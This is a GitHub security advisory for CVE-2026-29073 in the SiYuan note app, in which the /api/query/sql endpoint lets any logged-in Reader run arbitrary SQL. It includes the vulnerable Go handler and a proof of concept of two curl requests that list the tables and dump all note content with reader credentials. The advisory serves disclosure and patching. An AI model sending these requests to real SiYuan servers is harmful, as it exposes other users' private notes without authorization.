# [M] SiYuan's direct SQL Query API accessible to Reader-level users enables unauthorized database access

## Summary
Severity: Medium
Advisory: GHSA-jqwg-75qf-vmf9
CVE: CVE-2026-29073
CWE: CWE-862, CWE-89
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N/E:P (CVSS_V4)
Published: 2026-03-03
Source: https://github.com/advisories/GHSA-jqwg-75qf-vmf9
Type: github-advisory

## Affected
- Go: `github.com/siyuan-note/siyuan/kernel` — affected >=0

## Details
### Summary
/api/query/sql allows users to run SQL directly, but it only checks basic auth, not admin rights, any logged-in user, even readers, can run any  SQL query on the database.

### Details

The vulnerable endpoint is in kernel/api/sql.go 

```go
func SQL(c *gin.Context) {
    ret := gulu.Ret.NewResult()
    defer c.JSON(http.StatusOK, ret)

    arg, ok := util.JsonArg(c, ret)
    if !ok {
        return
    }

    stmt := arg["stmt"].(string)
    result, err := sql.Query(stmt, model.Conf.Search.Limit) // ... runs arbitrary sql with no restrictions
}
```

The route in kernel/api/router.go only uses CheckAuth middleware

e.g (similar)

```go
ginServer.Handle("POST", "/api/query/sql", model.CheckAuth, SQL)
```

### PoC

Start SiYuan with the publish service turned on

```bash

# List out all tables in the database

curl -s -u reader_user:reader_pass \
  -X POST "http://127.0.0.1:6808/api/query/sql" \
  -H "Content-Type: application/json" \
  -d '{"stmt": "SELECT name, type FROM sqlite_master WHERE type='"'"'table'"'"'"}'


# Extract all user content from the database

curl -s -u reader_user:reader_pass \
  -X POST "http://127.0.0.1:6808/api/query/sql" \
  -H "Content-Type: application/json" \
  -d '{"stmt": "SELECT id, content FROM blocks"}'

```

### Impact
- High impact, reader users can query all data in the db including other users notes
- SQL api is mostly for select queries, but without validation, writes can still happen
- Malicious SQL can lead to serious performance issues

this is an auth bypass, the sql feature is for power users but even readers can use it

## References
- https://github.com/siyuan-note/siyuan/security/advisories/GHSA-jqwg-75qf-vmf9
- https://nvd.nist.gov/vuln/detail/CVE-2026-29073
- https://github.com/siyuan-note/siyuan
